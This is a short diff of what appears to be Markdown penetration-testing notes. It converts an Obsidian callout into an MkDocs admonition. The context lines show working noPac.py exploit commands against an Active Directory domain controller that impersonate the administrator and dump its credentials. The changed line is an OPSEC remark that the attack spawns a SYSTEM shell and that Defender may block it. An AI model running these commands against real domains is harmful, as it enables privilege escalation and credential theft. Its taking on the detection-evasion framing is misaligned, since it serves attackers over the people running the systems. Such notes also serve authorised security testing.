@@ -27,4 +27,4 @@ sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip <dcip>  -dc-host DC01 -she
 sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip <dcip>  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator
 ```
 
-> [!important] OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution.
+!!! alert "OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution."
